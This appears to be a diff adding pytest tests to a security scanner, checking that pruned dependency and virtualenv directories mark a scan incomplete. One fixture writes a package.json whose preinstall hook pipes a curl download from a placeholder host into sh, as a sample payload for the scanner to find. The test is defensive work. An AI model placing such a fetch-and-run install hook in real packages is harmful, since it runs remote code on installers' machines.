@@ -705,6 +705,60 @@ class TestThresholdsCannotWeakenTheGate:
 
 
 @pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
+class TestPrunedInstalledCodeIsIncomplete:
+    """`node_modules`, a virtualenv and the editor directories are pruned by
+    default, and the coverage note that says so was reported at low severity --
+    but the scan still reported itself complete, so a live payload in an
+    installed package exited zero. Pruning code that runs marks the scan
+    incomplete, so `--fail-on-incomplete` fails on it, while a default scan stays
+    as quiet as before. Build output and caches do not, because their absence
+    narrows no coverage.
+    """
+
+    def _tree(self, tmp_path: Path, pruned: str) -> Path:
+        root = tmp_path / "r"
+        (root / pruned / "left-pad").mkdir(parents=True)
+        (root / pruned / "left-pad" / "package.json").write_text(
+            '{"name":"left-pad","scripts":{"preinstall":"curl -s https://x.invalid/i|sh"}}',
+            encoding="utf-8",
+        )
+        (root / "package.json").write_text('{"name":"app"}', encoding="utf-8")
+        return root
+
+    def test_a_pruned_dependency_tree_marks_the_scan_incomplete(self, tmp_path) -> None:
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(
+            self._tree(tmp_path, "node_modules")
+        )
+        assert result.complete is False
+        assert any(f.rule_id == "POLICY.COVERAGE.PRUNED" for f in result.findings)
+
+    def test_a_virtualenv_counts_too(self, tmp_path) -> None:
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(
+            self._tree(tmp_path, ".venv")
+        )
+        assert result.complete is False
+
+    def test_pruned_build_output_stays_complete(self, tmp_path) -> None:
+        """`dist` and `__pycache__` are reproducible and carry nothing a scan is
+        for; skipping them is not a coverage loss."""
+        root = tmp_path / "r"
+        (root / "dist").mkdir(parents=True)
+        (root / "__pycache__").mkdir(parents=True)
+        (root / "dist" / "bundle.js").write_text("built", encoding="utf-8")
+        (root / "app.py").write_text("x = 1\n", encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+        assert result.complete is True
+
+    def test_a_default_scan_stays_quiet(self, tmp_path) -> None:
+        """The note is still low and the default gate still passes: the fix adds
+        a signal for the operator who asks for one, it does not add noise."""
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(
+            self._tree(tmp_path, "node_modules")
+        )
+        blocking = [f for f in result.findings if f.severity >= Severity.MEDIUM]
+        assert not blocking
+
+
 class TestUnreadableIsNotClean:
     """A repository nothing can be read from must not report like an empty one.
 
